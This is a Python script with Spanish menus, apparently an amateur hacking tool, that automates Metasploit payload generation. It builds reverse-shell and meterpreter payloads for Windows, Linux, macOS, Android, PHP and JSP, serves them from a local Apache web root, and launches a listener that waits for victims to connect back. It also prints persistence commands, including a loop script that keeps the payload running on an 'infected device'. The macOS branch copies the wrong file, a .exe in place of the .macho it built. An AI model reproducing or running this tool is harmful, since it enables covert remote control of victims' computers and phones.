#!/usr/bin/python
#-*- coding: utf-8 -*-
#Aureliohacking


import os
import time

os.system("clear")

ruta = os.getcwd() + "/output/"


def msfvenom1(lhost,lport,nombre):

    os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ lhost + " LPORT=" + lport + " -f exe > " + ruta + nombre + ".exe")
    print("Enviando el archio a la ruta var/www/html")
    time.sleep(2)
    os.system("cp " + ruta + nombre + ".exe " + "/var/www/html")
    print("Servicio de apache esta activado")
    time.sleep(2)
    os.system("service apache2 start")
    time.sleep(2)
    print("Que el proceso ha sido completado....")
    print(" Iniciando el modo escucha...........")
    time.sleep(2)
    
    opcion = input("Desea continuar con el proceso S/N  ")

    if opcion == 'S':
    	file = open(ruta + "metasploit.rc", "w")
    	file.write("use exploit/multi/handler" + os.linesep)
    	file.write("set payload windows/meterpreter/reverse_tcp" + os.linesep)
    	file.write("set LHOST "+ lhost + os.linesep)
    	file.write("set LPORT "+ lport + os.linesep)
    	file.write("exploit")
    	file.close()
    	os.system('clear')
    	print("Iniciando el ataque....")
    	os.system("msfconsole -r" + ruta + "metasploit.rc")
    else:
    	os.system("clear")


def msfvenom2(lhost,lport,nombre):

    os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="+ lhost + " LPORT=" + lport + " -f elf > " + ruta + nombre + ".elf")
    print("Enviando el archio a la ruta var/www/html")
    time.sleep(2)
    os.system("cp " + ruta + nombre + ".elf " + "/var/www/html")
    print("Servicio de apache esta activado")
    time.sleep(2)
    os.system("service apache2 start")
    time.sleep(2)
    print("Que el proceso ha sido completado....")
    print(" Iniciando el modo escucha")
    time.sleep(2)

    opcion = input("Desea continuar con el proceso S/N  ")

    if opcion == 'S':
    	file = open(ruta + "metasploit.rc", "w")
    	file.write("use exploit/multi/handler" + os.linesep)
    	file.write("set payload linux/x86/meterpreter/reverse_tcp" + os.linesep)
    	file.write("set LHOST "+ lhost + os.linesep)
    	file.write("set LPORT "+ lport + os.linesep)
    	file.write("exploit")
    	file.close()
    	os.system('clear')
    	print("Iniciando el ataque....")
    	os.system("msfconsole -r" + ruta + "metasploit.rc")
    else:
    	os.system("clear")   


def msfvenom3(lhost,lport,nombre):

    os.system("msfvenom -p osx/x86/shell_reverse_tcp LHOST="+ lhost + " LPORT=" + lport + " -f macho > " + ruta + nombre + ".macho")
    print("Enviando el archio a la ruta var/www/html")
    time.sleep(2)
    os.system("cp " + ruta + nombre + ".exe " + "/var/www/html")
    print("Servicio de apache esta activado")
    time.sleep(2)
    os.system("service apache2 start")
    time.sleep(2)
    print("Que el proceso ha sido completado....")
    print(" Iniciando el modo escucha")
    time.sleep(2)

    opcion = input("Desea continuar con el proceso S/N  ")

    if opcion == 'S':
    	file = open(ruta + "metasploit.rc", "w")
    	file.write("use exploit/multi/handler" + os.linesep)
    	file.write("set payload osx/x86/shell_reverse_tcp " + os.linesep)
    	file.write("set LHOST "+ lhost + os.linesep)
    	file.write("set LPORT "+ lport + os.linesep)
    	file.write("exploit")
    	file.close()
    	os.system('clear')
    	print("Iniciando el ataque....")
    	os.system("msfconsole -r" + ruta + "metasploit.rc")
    else:
    	os.system("clear") 


def msfvenom4(lhost,lport,nombre):

    os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+ lhost + " LPORT=" + lport + " R > " + ruta + nombre + ".apk")
    print("Enviando el archio a la ruta var/www/html")
    time.sleep(2)
    os.system("cp " + ruta + nombre + ".apk " + "/var/www/html")
    print("Servicio de apache esta activado")
    time.sleep(2)
    os.system("service apache2 start")
    time.sleep(2)
    print("Que el proceso ha sido completado....")
    print(" Iniciando el modo escucha")
    time.sleep(2)

    opcion = input("Desea continuar con el proceso S/N  ")

    if opcion == 'S':
    	file = open(ruta + "metasploit.rc", "w")
    	file.write("use exploit/multi/handler" + os.linesep)
    	file.write("set payload android/meterpreter/reverse_tcp" + os.linesep)
    	file.write("set LHOST "+ lhost + os.linesep)
    	file.write("set LPORT "+ lport + os.linesep)
    	file.write("exploit")
    	file.close()
    	os.system('clear')
    	print("Iniciando el ataque....")
    	os.system("msfconsole -r" + ruta + "metasploit.rc")
    else:
    	os.system("clear") 


def msfvenom5(lhost,lport,nombre):

    os.system("msfvenom -p php/meterpreter/reverse_tcp LHOST="+ lhost + " LPORT=" + lport + " R > " + ruta + nombre + ".php")
    print("Enviando el archio a la ruta var/www/html")
    time.sleep(2)
    os.system("cp " + ruta + nombre + ".php " + "/var/www/html")
    print("Servicio de apache esta activado")
    time.sleep(2)
    os.system("service apache2 start")
    time.sleep(2)
    print("Que el proceso ha sido completado....")
    print(" Iniciando el modo escucha")
    time.sleep(2)

    opcion = input("Desea continuar con el proceso S/N  ")

    if opcion == 'S':
    	file = open(ruta + "metasploit.rc", "w")
    	file.write("use exploit/multi/handler" + os.linesep)
    	file.write("set payload php/meterpreter/reverse_tcp" + os.linesep)
    	file.write("set LHOST "+ lhost + os.linesep)
    	file.write("set LPORT "+ lport + os.linesep)
    	file.write("exploit")
    	file.close()
    	os.system('clear')
    	print("Iniciando el ataque....")
    	os.system("msfconsole -r" + ruta + "metasploit.rc")
    else:
    	os.system("clear") 


def msfvenom6(lhost,lport,nombre):

    os.system("msfvenom -p java/jsp_shell_reverse_tcp LHOST="+ lhost + " LPORT=" + lport + " R > " + ruta + nombre + ".jsp")
    print("Enviando el archio a la ruta var/www/html")
    time.sleep(2)
    os.system("cp " + ruta + nombre + ".jsp " + "/var/www/html")
    print("Servicio de apache esta activado")
    time.sleep(2)
    os.system("service apache2 start")
    time.sleep(2)
    print("Que el proceso ha sido completado....")
    print(" Iniciando el modo escucha")
    time.sleep(2)

    opcion = input("Desea continuar con el proceso S/N  ")

    if opcion == 'S':
    	file = open(ruta + "metasploit.rc", "w")
    	file.write("use exploit/multi/handler" + os.linesep)
    	file.write("set payload java/jsp_shell_reverse_tcp" + os.linesep)
    	file.write("set LHOST "+ lhost + os.linesep)
    	file.write("set LPORT "+ lport + os.linesep)
    	file.write("exploit")
    	file.close()
    	os.system('clear')
    	print("Iniciando el ataque....")
    	os.system("msfconsole -r" + ruta + "metasploit.rc")
    else:
    	os.system("clear") 



def menu():

    print('''
     _________ _______  _______  _        _______                   
     \__   __/(  ___  )(  ___  )( \      (  ____ \                  
        ) (   | (   ) || (   ) || (      | (    \/                  
        | |   | |   | || |   | || |      | (_____                   
        | |   | |   | || |   | || |      (_____  )                  
        | |   | |   | || |   | || |            ) |                  
        | |   | (___) || (___) || (____/\/\____) |                  
        )_(   (_______)(_______)(_______/\_______)                  
                                                               
      _______  _______           _        _______  _______  ______  
     (  ____ )(  ___  )|\     /|( \      (  ___  )(  ___  )(  __  \ 
     | (    )|| (   ) |( \   / )| (      | (   ) || (   ) || (  \  )
     | (____)|| (___) | \ (_) / | |      | |   | || (___) || |   ) |
     |  _____)|  ___  |  \   /  | |      | |   | ||  ___  || |   | |
     | (      | (   ) |   ) (   | |      | |   | || (   ) || |   ) |
     | )      | )   ( |   | |   | (____/\| (___) || )   ( || (__/  )
     |/       |/     \|   \_/   (_______/(_______)|/     \|(______/                                                             
                                                                       
                                                    @aureliohacking   ''')
    print("Selecciones una opcion")
    print("\t 1) Crear un Payload para Windows")
    print("\t 2) Crear un Payload para Linux")
    print("\t 3) Crear un Payload para Mac")
    print("\t 4) Crear un Payload para Android")
    print("\t 5) Crear un Payload para PHP")
    print("\t 6) Crear un Payload para Java")
    print("\t 7) Para Generar Persistencia")
    print("\t 8) Salir")



while True:




    menu()

    opcionMenu = input("Ingresar una opcion >> ")

    if opcionMenu == '1':

    	lhost = input( "Ingresar LHOST >> ")
    	lport = input("Ingresar LPORT >> ")
    	nombre = input("Ingresar Nombre >> ")
    	msfvenom1(lhost,lport,nombre)

    if opcionMenu == '2':

    	lhost = input( "Ingresar LHOST >> ")
    	lport = input("Ingresar LPORT >> ")
    	nombre = input("Ingresar Nombre >> ")
    	msfvenom2(lhost,lport,nombre)


    if opcionMenu == '3':

    	lhost = input( "Ingresar LHOST >> ")
    	lport = input("Ingresar LPORT >> ")
    	nombre = input("Ingresar Nombre >> ")
    	msfvenom3(lhost,lport,nombre)

    if opcionMenu == '4':

    	lhost = input( "Ingresar LHOST >> ")
    	lport = input("Ingresar LPORT >> ")
    	nombre = input("Ingresar Nombre >> ")
    	msfvenom4(lhost,lport,nombre)
    

    if opcionMenu == '5':

    	lhost = input( "Ingresar LHOST >> ")
    	lport = input("Ingresar LPORT >> ")
    	nombre = input("Ingresar Nombre >> ")
    	msfvenom5(lhost,lport,nombre)   	
    
    if opcionMenu == '6':

    	lhost = input( "Ingresar LHOST >> ")
    	lport = input("Ingresar LPORT >> ")
    	nombre = input("Ingresar Nombre >> ")
    	msfvenom6(lhost,lport,nombre)

    if opcionMenu == '7':

    	print("Digite 1 para Persistencia de Windows")
    	print("Digite 2 para Persistencia de Mac")
    	print("Digite 3 para Persistencia de Android")

    	persistencia = input(" >> ")

    	if persistencia == '1':
    		ip = input( "Ingresar LHOST >> ")
    		puerto = input("Ingresar LPORT >> ")
    		print("run persistence -U -X 30 -p", puerto,"-r", ip)
    		continuar = input("Presione ENTER continuar....")
    		os.system("clear")		
    	
    	if persistencia == '2':

    		nombre = input( "Digita el nombre de tu payload con su respectiva extension Ej: shell.macho >> ")
    		print("defaults write /Library/Preferences/loginwindow AutoLaunchedApplicationDictionary -array-add ‘{Path=”/Applications/Utilities/",nombre,"”;}’")
    		continuar = input("Presione ENTER continuar....")
    		os.system("clear")	

    	if persistencia == '3':
    		print(".......Copiar y Guardarlo en un archivo nombre android.sh en una ruta cualquiera y luego subir al dispositivo infectado........")

    		print('''
    	          #!/bin/bash
                  while :
                  do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
                  sleep 20
                  done''')


    		continuar = input("Presione ENTER continuar....")
    		os.system("clear")	

    if opcionMenu == '8':

    	salir = input("Desea salir del programa S/N ")

    	if salir == 'S':

    		exit()
    	else:
    		os.system("clear")